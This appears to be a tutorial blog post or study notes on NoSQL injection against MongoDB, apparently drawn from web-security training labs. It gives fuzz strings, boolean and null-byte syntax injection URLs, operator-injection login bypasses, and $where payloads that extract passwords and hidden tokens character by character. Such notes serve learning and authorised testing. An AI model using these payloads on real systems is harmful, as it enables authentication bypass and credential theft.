---
title: "NoSQL Injection Techniques and Exploits"
summary: "Exploring NoSQL injection techniques, including syntax injection and operator abuse. A complete guide for beginners and a refresher."
date: "Dec 20 2024"
draft: false
tags:
  - Web
---


### Types
- syntax injection
- operator injection
### NoSQL Syntax Injection

- **Definition:** Similar to SQL injection,  involves breaking the query syntax and exploiting vulnerabilities.

#### Detecting Syntax Injection in MongoDB

1. Test each input by submitting fuzz strings and special characters.

#### Fuzz Strings

```
'"`{ ;$Foo} $Foo \xYZ '%00
```

```
' " \ ; { } ( )
```

#### Testing

**Example:**

`https://insecure-website.com/product/lookup?category=fizzy`

- The server handles the query as:
    
    ```javascript
    this.category == 'fizzy'
    ```
    
- Fuzz the input using the _fuzz strings_ and analyze the response.
    
- Determine which characters (e.g., single or double quotes) impact the query.
    

**Examples:**

```javascript
this.category == '''
this.category == '\''
```

#### Boolean Influence Testing

**False Output:**

```
https://insecure-website.com/product/lookup?category=fizzy'+&&+0+&&+'x
```

- No categories are displayed since the query evaluates to false.

**True Output:**

```
https://insecure-website.com/product/lookup?category=fizzy'+&&+1+&&+'x
```

- The `fizzy` category is displayed, indicating boolean influence.

#### Overriding Existing Conditions

- Use the `||` (OR) operator to override conditions, ensuring the query always returns true:

```
https://insecure-website.com/product/lookup?category=fizzy'||'1'=='1
```

- Server query becomes:

```javascript
this.category == 'fizzy'||'1'=='1'
```

- All categories are displayed.

#### Null Character Injection

- MongoDB may ignore all characters after a null character (`\u0000`).

**Example:**

If the server query is:

```javascript
this.category == 'fizzy' && this.released == 1
```

After injecting a null character:

```javascript
this.category == 'fizzy'\u0000' && this.released == 1
```

- Unreleased objects may be displayed.

---

### Operator Injection

- **Definition:** Abusing NoSQL operators like `$where`, `$ne`, `$in`, and `$regex` to exploit vulnerabilities.

#### Injecting into Query Operators

1. **Example Query:**

```json
{"username":"wiener"}
```

- Queries for username = `wiener`.

**Injection Example:**

```json
{"username":{"$ne":"invalid"}}
```

- Query becomes `username != invalid`, which returns all usernames except `invalid`.

2. Transforming input:

```
username=wiener becomes username[$ne]=invalid
```

3. Complex Query Example:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

- Fetches data if the username is one of `admin`, `administrator`, or `superadmin`, and the password is not empty.

#### Steps to Test:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators into the JSON.

---

### Exfiltrating Data in MongoDB

**Example:**

```
https://insecure-website.com/user/lookup?username=admin
```

Server query:

```json
{"$where":"this.username == 'admin'"}
```

#### Payload Examples:

1. To check if the first character of the password is `a`:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

2. To check if the password contains digits:

```
admin' && this.password.match(/\d/) || 'a'=='b
```

3. To find the password length using binary search:

```
administrator' && this.password.length < 30 || 'a'=='b
```

---

### Extracting Field Names, Lengths, and Values

**Example Query:**

```javascript
db.user.findOne(userInfo)

let userInfo = {
    "_id": "skjfskmjfsdf",
    "username": "carlos",
    "password": {
        "$ne": ""
    },
    "$where": "function(){ return 0;}"
}
```

#### Steps to Extract Information:

1. Check error messages:
    
    - **1:** Account Locked
    - **0:** Invalid
2. Find hidden field names and their lengths:
    

**Example Payloads:**

- Find hidden field name:

```javascript
"$where": "function(){ if(Object.keys(this)[0].match('_id')) return 1; else 0; }"
```

- Find hidden field name length:

```javascript
"$where": "function(){ if(Object.keys(this)[3].length == 1) return 1; else 0; }"
```

- Hidden field name `unlockToken`:

```javascript
"$where": "function(){ if(this.unlockToken.length == 1) return 1; else 0; }"
```

3. Determine value length and content:

- Length is 16:

```javascript
"$where": "function(){ if(this.unlockToken.length == 16) return 1; else 0; }"
```

- Check if value starts with `a`:

```javascript
"$where": "function(){ if(this.unlockToken.match(/^a/)) return 1; else 0; }"
```

- Check if value contains digits:

```javascript
"$where": "function(){ if(this.unlockToken.match(/\\d/)) return 1; else 0; }"
```

---